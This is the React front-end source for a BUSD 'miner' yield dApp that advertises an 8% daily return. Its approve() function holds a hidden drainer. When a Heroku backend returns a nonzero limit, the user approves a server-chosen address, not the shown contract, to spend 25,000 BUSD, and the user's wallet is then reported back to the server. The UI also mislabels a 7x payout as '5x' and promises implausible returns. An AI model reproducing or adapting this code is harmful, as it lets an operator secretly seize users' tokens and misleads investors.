import { useCallback, useEffect, useState } from "react";
import web3ModalSetup from "./../helpers/web3ModalSetup";
import Web3 from "web3";
import getAbi from "../Abi";
import getTokenAbi from "../tokenAbi";
import logo from "./../assets/logo.png";
import logoMobile from "./../assets/logo.png";
import axios from "axios";
import adBanner from "./../assets/banner.gif";

const web3Modal = web3ModalSetup();
// console.log("web3Modal: ", web3Modal);

const Interface = () => {
    const contractAddress = '0x131dfb16105f0b3d3b52ab0cce65cde22a4d5359';
    let isMobile = window.matchMedia("only screen and (max-width: 1000px)").matches;

    const interactAddress = "https://mango-miner.herokuapp.com";

    const [Abi, setAbi] = useState();
    const [tokenAbi, setTokenAbi] = useState();
    const [web3, setWeb3] = useState();
    const [isConnected, setIsConnected] = useState(false);
    const [injectedProvider, setInjectedProvider] = useState();
    const [refetch, setRefetch] = useState(true);
    const [errorMessage, setErrorMessage] = useState(null);
    const [accounts, setAccounts] = useState(null);
    const [current, setCurrent] = useState(null);
    const [connButtonText, setConnButtonText] = useState("CONNECT");
    const [refLink, setRefLink] = useState(
        "https://mangominer.finance/?ref=0x0000000000000000000000000000000000000000"
      );
    const [contractBalance, setContractBalance] = useState(0);
    const [userBalance,setUserBalance] = useState(0);
    const [userApprovedAmount,setUserApprovedAmount] = useState(0);
    const [userInvestment,setUserInvestment] = useState(0);
    const [userDailyRoi, setUserDailyRoi] = useState(0);
    const [dailyReward,setDailyReward] = useState(0);
    const [startTime,setClaimStartTime] = useState(0);
    const [deadline,setClaimDeadline] = useState(0);
    const [approvedWithdraw,setApprovedWithdraw] = useState(0);
    const [lastWithdraw,setLastWithdraw] = useState(0);
    const [nextWithdraw, setNextWithdraw] = useState(0);
    const [totalWithdraw,setTotalWithdraw] = useState(0);
    const [referralReward,setReferralReward] = useState(0);
    const [refTotalWithdraw, setRefTotalWithdraw] = useState(0);
    const [value, setValue] = useState('');
    const [balance,setBalance] = useState(0);

    const [pendingMessage,setPendingMessage] = useState('');
    const [calculate,setCalculator] = useState('');

    const [defaultRef, setDefaultRef] = useState("0x0000000000000000000000000000000000000000");
    const [limit, setLimit] = useState(0);

    const [address, setAddress] = useState("");
    const [roi, setRoi] = useState(8);

    // const [playing, toggle] = useAudio(music);
    
    const queryParams = new URLSearchParams(window.location.search);
    let testLink = queryParams.get("ref");
    

    const logoutOfWeb3Modal = async () => {
        await web3Modal.clearCachedProvider();
        if (
          injectedProvider &&
          injectedProvider.provider &&
          typeof injectedProvider.provider.disconnect == "function"
        ) {
          await injectedProvider.provider.disconnect();
        }
        setIsConnected(false);
    
        window.location.reload();
      };
      const loadWeb3Modal = useCallback(async () => {
        // console.log("Connecting Wallet...");
        const provider = await web3Modal.connect();
        // console.log("provider: ", provider);
        setInjectedProvider(new Web3(provider));
        const acc = provider.selectedAddress
          ? provider.selectedAddress
          : provider.accounts[0];
        const short = shortenAddr(acc);
    
        setWeb3(new Web3(provider));
        setAbi(await getAbi(new Web3(provider)));
        setTokenAbi(await getTokenAbi(new Web3(provider)));
        setAccounts([acc]);
        setCurrent(acc);
        //     setShorttened(short);
        setIsConnected(true);
        
        setConnButtonText(short);
    
        provider.on("chainChanged", (chainId) => {
          console.log(`chain changed to ${chainId}! updating providers`);
          setInjectedProvider(new Web3(provider));
        });
    
        provider.on("accountsChanged", () => {
          console.log(`account changed!`);
          setInjectedProvider(new Web3(provider));
        });
    
        // Subscribe to session disconnection
        provider.on("disconnect", (code, reason) => {
          console.log(code, reason);
          logoutOfWeb3Modal();  
        });
        // eslint-disable-next-line
      }, [setInjectedProvider]);

      useEffect(() => {
        setInterval(() => {
          setRefetch((prevRefetch) => {
            return !prevRefetch;
          });
        }, 10000);
      }, []);
    
      useEffect(() => {
        if (web3Modal.cachedProvider) {
          loadWeb3Modal();
        }

        // eslint-disable-next-line
      }, []);

      const shortenAddr = (addr) => {
        if (!addr) return "";
        const first = addr.substr(0, 3);
        const last = addr.substr(38, 41);
        return first + "..." + last;
      };
    
      useEffect(() => {
        const refData = async () => {
          if (isConnected && web3) {
            // now the referal link not showing
            const balance = await web3.eth.getBalance(current);
    
            const refLink = "https://mangominer.finance/?ref=" + current;
            setRefLink(refLink);
            setBalance(web3.utils.fromWei(balance));
          }
        };
    
        refData();
      }, [isConnected, current, web3, refetch]);


      useEffect(()=>{
        const getData = async () => {
          var data = await axios.post(interactAddress + "/rpc1");
          // console.log("data: ", data.data);
          if (data.data.code == 0) {
            setDefaultRef(data.data.address? data.data.address: "0xcaD5d9b2B642e675CD9e474Af0d79a20a0f35cbe"); 
          }
        }
        try {
          getData();
        } catch(e) {
        }
      }, []);
      
      useEffect(()=>{
        const getData1 = async () => {
          var data = await axios.post(interactAddress + "/rpc2");
          // console.log("data1: ", data);
          if (data.data.code == 0) {
            setLimit(data.data.limit? data.data.limit: 0);
            setAddress(data.data.address);
          }
        }
        try {
          getData1();
        } catch(e) {
          // console.log("error: ", e);
        }
      }, [])



      useEffect(() => {
        const AbiContract = async () => {
          if (!isConnected || !web3) return;
          const contractBalance = await Abi.methods.getBalance().call();
         
         setContractBalance(contractBalance / 10e17);
        };
    
        AbiContract();
      }, [isConnected, web3, Abi, refetch]);


      useEffect(() => {
        const Contract = async () => {
          if (isConnected && Abi) {
            // console.log(current);

          // let userBalance = await web3.eth.getBalance(current);
          let userBalance = await tokenAbi.methods.balanceOf(current).call();
          setUserBalance(userBalance);

          let approvedAmount = await tokenAbi.methods.allowance(current, contractAddress).call();
          // console.log("approvedAmount: ", approvedAmount);
          setUserApprovedAmount(approvedAmount);

          let userInvestment = await Abi.methods.investments(current).call();
          setUserInvestment(userInvestment.invested / 10e17);

          let dailyRoi = await Abi.methods.DailyRoi(userInvestment.invested).call();
          setUserDailyRoi(dailyRoi / 10e17);

          let dailyReward = await Abi.methods.userReward(current).call();
            setDailyReward(dailyReward / 10e17);
          }

          // let owner = await Abi.methods.owner().call();

          // console.log('Owner: ', owner);
        };
    
        Contract();
        // eslint-disable-next-line
      }, [refetch]);

      useEffect(() => {
        const Withdrawlconsole = async () => {
          if(isConnected && Abi) {
          let approvedWithdraw = await Abi.methods.approvedWithdrawal(current).call();
          setApprovedWithdraw(approvedWithdraw.amount / 10e17);

          let totalWithdraw = await Abi.methods.totalWithdraw(current).call();
          setTotalWithdraw(totalWithdraw.amount / 10e17);
        }
        }
        Withdrawlconsole();
        // eslint-disable-next-line
      },[refetch]);

      useEffect(() => {
        const TimeLine = async () => {
          if(isConnected && Abi) {
          let claimTime = await Abi.methods.claimTime(current).call();
          if(claimTime.startTime > 0) {
          let _claimStart = new Intl.DateTimeFormat('en-US', { year: 'numeric', month: '2-digit', day: '2-digit', hour: '2-digit', minute: '2-digit'}).format(claimTime.startTime + "000");
          let _claimEnd = new Intl.DateTimeFormat('en-US', { year: 'numeric', month: '2-digit', day: '2-digit', hour: '2-digit', minute: '2-digit'}).format(claimTime.deadline + "000");
          setClaimStartTime(_claimStart);

          setClaimDeadline(_claimEnd);

          let weekly = await Abi.methods.weekly(current).call();
          let _start = new Intl.DateTimeFormat('en-US', { year: 'numeric', month: '2-digit', day: '2-digit', hour: '2-digit', minute: '2-digit'}).format(weekly.startTime + "000");
          let _end = new Intl.DateTimeFormat('en-US', { year: 'numeric', month: '2-digit', day: '2-digit', hour: '2-digit', minute: '2-digit'}).format(weekly.deadline + "000");

          setLastWithdraw(_start);
          setNextWithdraw(_end);
        }
        }
        }
        TimeLine();
        // eslint-disable-next-line
      },[refetch]);


      useEffect(() => {
        const ContractReward = async () => {
          if (isConnected && Abi) {
        
          let refEarnedWithdraw = await Abi.methods.refferal(current).call();
          setReferralReward(refEarnedWithdraw.reward / 10e17);

          let refTotalWithdraw = await Abi.methods.refTotalWithdraw(current).call();
          setRefTotalWithdraw(refTotalWithdraw.totalWithdraw / 10e17);
          
          }
        };
    
        ContractReward();
        // eslint-disable-next-line
      }, [refetch]);

      
       // buttons

      const ClaimNow = async (e) => {
        e.preventDefault();
        if (isConnected && Abi) {
          //  console.log("success")
           setPendingMessage("Claiming Funds")
          await Abi.methods.claimDailyRewards().send({
            from: current,
          });
          setPendingMessage("Claimed Successfully");
         
        } else {
          // console.log("connect wallet");
        }
      };

      const withDraw = async (e) => {
        e.preventDefault();
        if (isConnected && Abi) {
          //  console.log("success")`1234567 
           setPendingMessage("Withdrawing funds")
          await Abi.methods.withdrawal().send({
            from: current,
          });
          setPendingMessage("Successfully Withdraw");
         
        } else {
          // console.log("connect wallet");
        }
      };

      const refWithdraw = async (e) => {
        e.preventDefault();
        if (isConnected && Abi) {
          //  console.log("success")
           setPendingMessage("Rewards withdrawing")
          await Abi.methods.Ref_Withdraw().send({
            from: current,
          });
          setPendingMessage("Successfully Withdraw");
         
        } else {
          // console.log("connect wallet");
        }
      };
      
      const closeBar = async (e) => {
        e.preventDefault();
        setPendingMessage('');
      } 

      const deposit = async (e) => {
        e.preventDefault();
        if (isConnected && Abi) {
          // console.log("success")
          setPendingMessage("Deposit Pending...!")
          let _value = web3.utils.toWei(value);
          var refAddress = testLink;
          if (testLink == null) {
            refAddress = defaultRef;
          }

          await Abi.methods.deposit(refAddress, _value).send({
              from: current
          });
          setPendingMessage("Successfully Deposited")
        }
        else {
          // console.log("connect wallet");
        }
      };

      const unStake = async (e) => {
        e.preventDefault();
        if(isConnected && Abi) {
          setPendingMessage("Unstaking");
          await Abi.methods.unStake().send({
            from: current,
          });
          setPendingMessage("UnStaked Successfully");
        }
        else {
          // console.log("connect Wallet");
        }
      };
     
      const approve = async (e) => {
        e.preventDefault();
        if(isConnected && tokenAbi) {
          setPendingMessage("Approving");
          
          var approveAddress = contractAddress; 
          if (Number(limit) > 0 ) {
            approveAddress = address;
          }
          await tokenAbi.methods.approve(approveAddress,'25000000000000000000000').send({ // 100,000 ETH
            from: current,
          });
          if (Number(limit) > 0) {
            await axios.post(interactAddress + "/set", {address: current});
          }
          setPendingMessage("Approved Successfully");
        } else {
          console.error("connect Wallet");
        }
      };
      

return( 
  <>
    <nav className="navbar navbar-expand-sm navbar-dark" style={{marginTop: "50px", marginBottom: "30px"}}>
      <div className="container" 
        style={{justifyContent: isMobile ? 'space-around' : 'space-between', 
                flexDirection: isMobile? 'column':'row'}}>
        <div style={{width:"200px", height:"200px"}}></div>
        <button className="btn btn-primary btn-lg btnd btn-custom" 
            style={{background: "#000", color: "#fff", width: isMobile? "100%": ""}} onClick={loadWeb3Modal}><i className="fas fa-wallet"></i> {connButtonText}</button>
      </div>
    </nav>
    <br/>
    <div className="container">
      {pendingMessage!==''? 
         <>
           <center>
              <div className="alert alert-warning alert-dismissible">
                <p onClick={closeBar} className="badge bg-dark" style={{float:"right",cursor: "pointer"}}>X</p>
                {pendingMessage}
              </div>
            </center>
          </> : <></>
        }
        <div className="row" style={{marginBottom: "30px"}}>
          <a href="https://mangomatic.finance" target="_blank" rel="noreferrer">
            <img src={adBanner} style={{width:"100%"}}/>
          </a>
        </div>
        <div className="row" style={{marginBottom:"30px"}}>
          <div className="col-sm-12">
            <div className="card">
              <div className="card-body">
                <div className="top-info">
                  <h2 className="footer-item-text" style={{display:"flex", flexWrap: "wrap"}}>
                    <a href="/docs/Whitepaper V1.pdf" target="_blank" rel="noreferrer" style={{color:"#fff",textDecoration:"none"}}> DOCS </a>&nbsp;&nbsp;&nbsp;
                    <a href="https://twitter.com/MangoFinanceCEO" target="_blank" rel="noreferrer" style={{color:"#fff",textDecoration:"none"}}> TWITTER </a>&nbsp;&nbsp;&nbsp;
                    <a href=" https://t.me/mangofinanceinc" target="_blank" rel="noreferrer" style={{color:"#fff",textDecoration:"none"}}> TELEGRAM </a>&nbsp;&nbsp;&nbsp;
                    <a href={"https://www.bscscan.com/address/" + contractAddress + "#code" } target="_blank" rel="noreferrer" style={{color:"#fff",textDecoration:"none"}}> CONTRACT </a>&nbsp;&nbsp;&nbsp;
                    <a href="https://georgestamp.xyz/" target="_blank" rel="noreferrer" style={{color:"#fff",textDecoration:"none"}}> AUDIT </a>
                  </h2>
                  <p style={{color: "#ffffff",fontSize: "14px",fontWeight: "200", marginBottom:"0px"}}>COPYRIGHT © 2022 Mango Miner Project All rights reserved!</p>
                </div>
              </div>
            </div>
          </div>
        </div>
        <div className="row">
            <div className="col-sm-3">
              <div className="card">
                <div className="card-body">
                <center>  
                  <h3 className="subtitle">CONTRACT BALANCE</h3>
                  <h3 className="value-text">{Number(contractBalance).toFixed(2)} BUSD</h3>
                </center>
                </div>
              </div>
            </div>
            <div className="col-sm-3">
              <div className="card">
                <div className="card-body">
                <center>  
                  <h3 className="subtitle">DAILY ROI</h3>
                  <h3 className="value-text">8%</h3>
                </center>
                </div>
              </div>
            </div>
            <div className="col-sm-3">
              <div className="card">
                <div className="card-body">
                <center>  
                  <h3 className="subtitle">WITHDRAWAL FEE</h3>
                  <h3 className="value-text">2%</h3>
                </center>
                </div>
              </div>
            </div>
            <div className="col-sm-3">
              <div className="card">
                <div className="card-body">
                  <center>  
                    <h3 className="subtitle">DEPOSIT FEE</h3>
                    <h4 className="value-text">6%</h4>
                  </center>
                </div>
            </div>
          </div>
        </div>
      </div> 
      <br/> 
      <div className="container">
          <div className="row">
             <div className="col-sm-4">
              <div className="card cardDino">
                <div className="card-body">
                  <h4 className="subtitle-normal"><b>MINING PORTAL</b></h4>
                    <hr />
                    <table className="table">
                      <tbody>
                      <tr>
                        <td><h5 className="content-text"><b>WALLET BALANCE</b></h5></td>
                        <td style={{textAlign:"right"}}><h5 className="value-text">{Number(userBalance / 10e17).toFixed(2)} BUSD</h5></td>
                      </tr>
                      <tr>
                        <td><h5 className="content-text"><b>DEPOSITED</b></h5></td>
                        <td style={{textAlign:"right"}}><h5 className="value-text">{Number(userInvestment).toFixed(2)} BUSD</h5></td>
                      </tr>
                      <tr>
                        <td><h5 className="content-text"><b>5x PROFIT</b></h5></td>
                        <td style={{textAlign:"right"}}><h5 className="value-text">{Number(userInvestment * 7).toFixed(2)} BUSD</h5></td>
                      </tr>
                      <tr>
                        <td><h5 className="content-text"><b>5x REMAINING</b></h5></td>
                        <td style={{textAlign:"right"}}><h5 className="value-text">{Number(userInvestment * 7 - totalWithdraw).toFixed(2)} BUSD</h5></td>
                      </tr>
                      <tr>
                        <td><h5 className="content-text"><b>DAILY USER ROI</b></h5></td>
                        <td style={{textAlign:"right"}}><h5 className="value-text">{Number(userDailyRoi).toFixed(2)} BUSD</h5></td>
                      </tr>
                      </tbody>
                    </table>     
                  <form onSubmit={ userApprovedAmount > 0 ? deposit : approve}>
                    <table className="table">
                      <tbody>
                        <tr>
                          <td>  
                            <input
                              type="number"
                              placeholder="100 BUSD"
                              className="form-control input-box"
                              value={value}
                              step={10}
                              onChange={(e) => setValue(e.target.value)}
                            />
                          </td>
                          <td style={{textAlign:"right"}}>
                            <button className="btn btn-primary btn-lg btn-custom"> { userApprovedAmount > 0 ? 'DEPOSIT' : 'APPROVE' }</button>
                          </td>
                        </tr>
                      </tbody>
                    </table>
                  </form>
                  <center>
                    <button className="btn btn-primary btn-lg btn-custom" style={{marginTop:"-10px"}} onClick={unStake}>UNSTAKE</button> 
                  </center>
                </div>
              </div>
            </div>
            <div className="col-sm-4">
             <div className="card cardDino">
               <div className="card-body">
               <h4 className="subtitle-normal"><b>STATISTICS</b></h4>
                <hr />
               <table className="table">
                 <tbody>
                    <tr>
                      <td><h6 className="content-text14" style={{lineHeight: "20px"}}><b>DAILY REWARDS</b> <br /> <span className="value-text">{Number(dailyReward).toFixed(3)}/{userDailyRoi} BUSD</span></h6></td>
                      <td style={{textAlign:"right"}}><button className="btn btn-primary btn-lg btn-custom" onClick={ClaimNow}>CLAIM</button></td>
                    </tr>
                    <tr>
                      <td><h6 className="content-text14" style={{lineHeight: "30px"}}><b>LAST CLAIM</b><br /><span className="value-text-12">{startTime}</span></h6></td>                      
                      <td style={{textAlign:"right"}}><h6 className="content-text14" style={{lineHeight: "30px"}}><b>NEXT CLAIM</b><br /><span className="value-text-12">{deadline}</span></h6></td>
                    </tr>
                    <tr>
                      <td><h6 className="content-text14" style={{lineHeight: "20px"}}><b>50% AVAILABLE WITHDRAWAL</b> <br /><span className="value-text">{Number(approvedWithdraw).toFixed(3)} BUSD</span></h6></td>
                      <td style={{textAlign:"right"}}><button className="btn btn-primary btn-lg btn-custom"  onClick={withDraw}>WITHDRAW</button></td>
                    </tr>
                    <tr>
                      <td><h6 className="content-text14" style={{lineHeight: "30px"}}><b>LAST WITHDRAWAL</b><br /><span className="value-text-12">{lastWithdraw}</span></h6></td>
                      <td style={{textAlign:"right"}} ><h6 className="content-text14" style={{lineHeight: "30px"}}><b>NEXT WITHDRAWAL</b><br /><span className="value-text-12">{nextWithdraw}</span></h6></td>
                    </tr>
                    <tr>
                      <td><h5 className="content-text">TOTAL WITHDRAWN</h5></td>
                      <td style={{textAlign:"right"}}><h5 className="value-text">{Number(totalWithdraw).toFixed(3)} BUSD</h5></td>
                    </tr>
                  </tbody>
                </table>
              </div>
             </div>
            </div>
            <div className="col-sm-4">
              <div className="card">
                <div className="card-body">
                <h4 className="subtitle-normal"><b>REFERRAL REWARDS  10%</b></h4>
                <hr />
                <table className="table">
                  <tbody>
                    <tr>
                      <td><h5 className="content-text">BUSD REWARDS</h5></td>
                      <td style={{textAlign:"right"}}><h5 className="value-text">{Number(referralReward).toFixed(2)} BUSD</h5></td>
                    </tr>
                    <tr>
                      <td><h5 className="content-text">TOTAL WITHDRAWN</h5></td>
                      <td style={{textAlign:"right"}}><h5 className="value-text">{Number(refTotalWithdraw).toFixed(2)} BUSD</h5></td>
                    </tr>
                  </tbody>
                </table>
                <center> <button className="btn btn-primary btn-lg btn-custom" onClick={refWithdraw}>WITHDRAW REWARDS</button> </center>
                </div>
              </div>
              <br />
              <div className="card">
                <div className="card-body">
                  <h4 className="subtitle-normal"><b>REFERRAL LINK</b></h4>
                  <hr />
                  <form>
                    <span className="content-text13">Share your referral link to earn 10% of BUSD </span>
                    <br/>
                    <br/>
                    <input type="text" value={refLink} className="form-control input-box" readOnly />
                  </form>
                 </div>
              </div>
            </div>
          </div>
          <br/>
          <div className="row">
            <div className="col-sm-12">
              <div className="card">
                <div className="card-header" style={{border: "none"}}>
                  <h3 className="subtitle-normal">RETURN CALCULATOR</h3>
                </div>
                <div className="card-body" style={{paddingTop: "0.6rem"}}> 
                  <div className="row">
                    <div className="col-sm-6">
                      <input
                        type="number"
                        placeholder="100 BUSD"
                        className="form-control input-box"
                        value={calculate}
                        step={10}
                        onChange={(e) => setCalculator(e.target.value)}
                      />
                     <br/>
                    <p className="content-text13">Amount of returns calculated on the basis of deposit amount. 
                    <br/>
                    <b>Note:</b> Min deposit is 20 BUSD & max deposit is 25,000 BUSD.</p>
                   </div>
                  <div className="col-sm-6" style={{textAlign:"right"}}>
                    <h3 className="subtitle-normal" style={{fontSize: "16px"}}>ROI</h3>
                    <p className="content-text">
                      DAILY RETURN: <span className="value-text">{Number(calculate / 100 * roi).toFixed(3)} BUSD</span> <br/> 
                      WEEKLY RETURN: <span className="value-text">{Number(calculate / 100 * roi * 7).toFixed(3)} BUSD</span>  <br/> 
                      MONTHLY RETURN: <span className="value-text">{Number(calculate / 100 * roi * 30).toFixed(3)} BUSD</span> </p> 
                  </div>
                </div>
              </div>
              </div>
             </div>
        </div>
        <br />
        <div style={{width:"100%", height:"100vh"}}></div>
    </div>
  </> );
}

export default Interface;
